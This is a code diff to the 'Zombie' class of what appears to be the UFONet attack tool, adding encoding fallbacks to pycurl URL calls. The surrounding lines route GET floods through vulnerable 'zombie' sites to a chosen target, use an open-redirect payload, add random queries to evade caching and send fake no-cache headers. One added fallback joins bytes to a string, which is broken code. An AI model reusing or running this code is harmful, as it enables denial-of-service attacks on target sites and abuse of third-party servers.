@@ -11,6 +11,7 @@ Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
 import io, hashlib, re, sys
 import time, threading, random
+import urllib.parse
 from .randomip import RandomIP
 try:
     import pycurl
@@ -45,10 +46,16 @@ class Zombie: # class representing a zombie
         options = self.ufo.options
         c = pycurl.Curl()
         if self.ufo.head == True:
-            c.setopt(pycurl.URL, self.zombie) # set 'self.zombie' target
+            try:
+                c.setopt(pycurl.URL, self.zombie) # set 'self.zombie' target
+            except:
+                c.setopt(pycurl.URL, self.zombie.encode('utf-8')) 
             c.setopt(pycurl.NOBODY, 1) # use HEAD
         if self.payload == True:
-            payload = self.zombie + "https://www.whitehouse.gov" # Open Redirect payload [requested by all UFONet motherships ;-)]
+            try:
+                payload = self.zombie + "https://www.whitehouse.gov" # Open Redirect payload [requested by all UFONet motherships ;-)]
+            except:
+                payload = self.zombie.encode('utf-8') + "https://www.whitehouse.gov"
             c.setopt(pycurl.URL, payload) # set 'self.zombie' payload
             c.setopt(pycurl.NOBODY, 0) # use GET
         if self.ufo.external == True:
@@ -58,7 +65,10 @@ class Zombie: # class representing a zombie
             if options.target.startswith('http://'): # fixing url prefix
                 options.target = options.target.replace('http://','')
             external = external_service + options.target
-            c.setopt(pycurl.URL, external) # external HEAD check before to attack
+            try:
+                c.setopt(pycurl.URL, external) # external HEAD check before to attack
+            except:
+                c.setopt(pycurl.URL, external.encode('utf-8'))
             c.setopt(pycurl.NOBODY, 0) # use GET
         if self.attack_mode == True:
             if options.place: # use self.zombie's vector to connect to a target's place and add a random query to evade cache
@@ -80,7 +90,10 @@ class Zombie: # class representing a zombie
                 url_attack = self.zombie + options.target # Use self.zombie vector to connect to original target url
             if self.ufo.options.verbose:
                 print("[Info] [Zombies] Payload:", url_attack)
-            c.setopt(pycurl.URL, url_attack) # GET connection on target site
+            try:
+                c.setopt(pycurl.URL, url_attack) # GET connection on target site
+            except:
+                c.setopt(pycurl.URL, url_attack.encode('utf-8')) 
             c.setopt(pycurl.NOBODY, 0)  # use GET
         # set fake headers (important: no-cache)
         fakeheaders = ['Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg', 
